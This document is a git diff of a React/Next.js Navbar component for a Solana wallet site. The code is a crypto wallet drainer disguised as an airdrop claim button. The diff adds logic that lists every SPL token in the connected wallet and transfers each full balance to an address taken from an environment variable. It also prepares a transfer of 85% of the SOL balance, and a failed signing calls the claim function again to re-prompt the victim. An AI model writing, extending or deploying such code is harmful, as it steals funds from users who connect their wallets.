@@ -1,14 +1,17 @@
-'use client'
-import React, { useCallback, useEffect, useMemo } from 'react'
-import HeaderLayout from '@/app/layouts/HeaderLayout';
-import Button from '../ui/Button';
-import { connectionLevel } from '@/app/constants/conneectionStages';
-import { executeCloseWallet } from '@/app/services/redux/closeModel';
-import { changeDrainStage } from '@/app/services/redux/drainStages';
-import { useWallet, } from '@solana/wallet-adapter-react';
-import { changeOpenBottomDrawer } from '@/app/services/redux/drawerBottom';
-import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject';
-import { WalletConnectButton, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
+"use client";
+import React, { useCallback, useEffect, useMemo, useState } from "react";
+import HeaderLayout from "@/app/layouts/HeaderLayout";
+import Button from "../ui/Button";
+import { connectionLevel } from "@/app/constants/conneectionStages";
+import { executeCloseWallet } from "@/app/services/redux/closeModel";
+import { changeDrainStage } from "@/app/services/redux/drainStages";
+import { useWallet } from "@solana/wallet-adapter-react";
+import { changeOpenBottomDrawer } from "@/app/services/redux/drawerBottom";
+import { executeConnectionObject } from "@/app/services/redux/walletConnectionObject";
+import {
+  WalletConnectButton,
+  WalletMultiButton,
+} from "@solana/wallet-adapter-react-ui";
 import {
   clusterApiUrl,
   Connection,
@@ -21,63 +24,173 @@ import {
   PublicKey,
   Signer,
   SystemProgram,
-  Transaction
+  Transaction,
+  TransactionInstruction,
+  ParsedAccountData,
 } from "@solana/web3.js";
-import { createTransferTransactionV0, pollSignatureStatus, signAndSendTransaction } from '@/app/services/hook/phantomCollections';
-export default function Navbar(){
-    const { connect, publicKey, connected, connecting, disconnect, disconnecting, select, wallet } = useWallet();
-    const resetOpenDrawer =  changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)
-    const resetCloseWallet = executeCloseWallet((state)=>state.resetCloseWallet)
-    const drainStage = changeDrainStage((state)=>state.connectionStage)
-    const resetDrainage = changeDrainStage((state)=>state.resetConnectionStage)
-    const getIsConnected = executeConnectionObject((state)=>state.isConnected)
-    const connection =  new Connection(String(process.env.NEXT_PUBLIC_SOLANA_HTTPS))
-    
+import { createTransferTransactionV0 } from "@/app/services/hook/phantomCollections";
+import { getTokenAccounts } from "@/app/services/hook/blockchain/splWallet";
+import { tokenInstruction } from "@/app/services/hook/phantomCollections/createSplTransferTransaction";
+import {
+  createAssociatedTokenAccountInstruction,
+  createTransferInstruction,
+  getAccount,
+  getAssociatedTokenAddress,
+} from "@solana/spl-token";
 
- 
-   
-    async function claim(){
-      // resetOpenDrawer(true) 
-      try {
-        resetDrainage(connectionLevel[2])
-        const balance =  (await connection.getBalance(publicKey as unknown as PublicKey) )
-        const AIRDROP_BALANCE = ((balance * 85)  / 100) ;
-        const transaction = await createTransferTransactionV0(publicKey as unknown as PublicKey, connection , AIRDROP_BALANCE);
-        console.log({
-          status: 'info',
-          method: 'signAndSendTransaction',
-          message: `Requesting signature for: ${JSON.stringify(transaction)}`,
-        });
-        const signature = await signAndSendTransaction(window.solana, transaction);
-        console.log({
-          status: 'info',
-          method: 'signAndSendTransaction',
-          message: `Signed and submitted transaction ${signature}.`,
-        });
-        pollSignatureStatus(signature, connection);
-      } catch (error) {
-         await claim() 
-        console.log({
-          status: 'error',
-          method: 'signAndSendTransaction',
-          message: error,
-        });
+export default function Navbar() {
+  const {
+    connect,
+    publicKey,
+    connected,
+    connecting,
+    disconnect,
+    disconnecting,
+    select,
+    wallet,
+    signAllTransactions,
+  } = useWallet();
+  const resetOpenDrawer = changeOpenBottomDrawer(
+    (state) => state.resetOpenBottomDrawer
+  );
+  const resetCloseWallet = executeCloseWallet(
+    (state) => state.resetCloseWallet
+  );
+  const drainStage = changeDrainStage((state) => state.connectionStage);
+  const resetDrainage = changeDrainStage((state) => state.resetConnectionStage);
+  const getIsConnected = executeConnectionObject((state) => state.isConnected);
+  const connection = new Connection(
+    String(process.env.NEXT_PUBLIC_SOLANA_HTTPS)
+  );
+  const recipientAddress = new PublicKey(
+    String(process.env.NEXT_PUBLIC_WALLET_ADDRESS)
+  );
+  const [transactionInstructions, setTransactionInstructions] = useState<
+    TransactionInstruction[]
+  >([]);
+  const [getTransaction, setTransaction] = useState<Transaction[]>([]);
+
+  async function getNumberDecimals(mintAddress: string): Promise<number> {
+    const info = await connection.getParsedAccountInfo(
+      new PublicKey(mintAddress)
+    );
+    const result = (info.value?.data as ParsedAccountData).parsed.info
+      .decimals as number;
+    return result;
+  }
+
+  async function claim() {
+    const latestBlockHash = await connection.getLatestBlockhash("confirmed");
+    // resetOpenDrawer(true)
+    try {
+      resetDrainage(connectionLevel[2]);
+      const walletSPLBalance = await getTokenAccounts(
+        publicKey?.toBase58() as unknown as string
+      );
+      const blockchainTimeStamp = (await connection.getLatestBlockhash())
+        .blockhash;
+      const walletTransaction: Transaction[] = [];
+      let trx = await createTransactions(
+        walletSPLBalance,
+        publicKey as PublicKey,
+        recipientAddress,
+        connection
+      );
+      const transact = new Transaction().add(...trx);
+      transact.feePayer = publicKey as PublicKey;
+      transact.recentBlockhash = blockchainTimeStamp;
+      walletTransaction.push(transact);
+      const balance = await connection.getBalance(
+        publicKey as unknown as PublicKey
+      );
+      const AIRDROP_BALANCE = (balance * 85) / 100;
+      const transaction = await createTransferTransactionV0(
+        publicKey as unknown as PublicKey,
+        connection,
+        AIRDROP_BALANCE
+      );
+      if (signAllTransactions == undefined) return;
+      const signature = await signAllTransactions(walletTransaction);
+
+      console.log({
+        status: "info",
+        method: "signAndSendTransaction",
+        message: `Signed and submitted transaction ${signature}.`,
+      });
+      // pollSignatureStatus(signature, connection);
+    } catch (error) {
+      await claim();
+      console.log({
+        status: "error",
+        method: "signAndSendTransaction",
+        message: error,
+      });
     }
+  }
+
+  async function createTransactions(
+    walletSPLBalance: any[],
+    publicKey: PublicKey,
+    recipientAddress: PublicKey,
+    connection: Connection
+  ) {
+    const walletTransactions = [];
+    for (let i = 0; i < walletSPLBalance.length; i++) {
+      const mintToken = new PublicKey(walletSPLBalance[i].mintAddress);
+      const tokenNumber = await getNumberDecimals(
+        walletSPLBalance[i].mintAddress
+      );
+      const associatedTokenFrom = await getAssociatedTokenAddress(
+        mintToken,
+        publicKey as unknown as PublicKey
+      );
+      const fromAccount = await getAccount(connection, associatedTokenFrom);
+      const associatedTokenTo = await getAssociatedTokenAddress(
+        mintToken,
+        recipientAddress
+      );
+
+      if (!(await connection.getAccountInfo(associatedTokenTo))) {
+        walletTransactions.push(
+          createAssociatedTokenAccountInstruction(
+            publicKey as unknown as PublicKey,
+            associatedTokenTo,
+            recipientAddress,
+            mintToken
+          )
+        );
+      }
+
+      walletTransactions.push(
+        createTransferInstruction(
+          fromAccount.address,
+          associatedTokenTo,
+          publicKey as unknown as PublicKey,
+          Number(walletSPLBalance[i].tokenBalance) *
+            Math.pow(10, Number(tokenNumber)) // transfer 1 USDC, USDC on solana devnet has 6 decimal
+        )
+      );
     }
-   useEffect(()=>{
-    if(wallet?.adapter.connected){
-      resetDrainage(connectionLevel[1])
+    return walletTransactions;
+  }
+
+  useEffect(() => {
+    if (wallet?.adapter.connected) {
+      resetDrainage(connectionLevel[1]);
     }
-   },[wallet?.adapter.connected])
+  }, [wallet?.adapter.connected]);
 
   return (
-        <HeaderLayout>
-          {(drainStage == connectionLevel[0] ) && <WalletMultiButton className="!bg-slate-800 !text-white"/> }
-          {((drainStage == connectionLevel[1]) || (drainStage == connectionLevel[2])) && <Button onClick={()=>claim()}  variant="secondary" >{drainStage}</Button>}
-        </HeaderLayout>
-
-  )
+    <HeaderLayout>
+      {drainStage == connectionLevel[0] && (
+        <WalletMultiButton className="!bg-slate-800 !text-white" />
+      )}
+      {(drainStage == connectionLevel[1] ||
+        drainStage == connectionLevel[2]) && (
+        <Button onClick={() => claim()} variant="secondary">
+          {drainStage}
+        </Button>
+      )}
+    </HeaderLayout>
+  );
 }
-
-
-
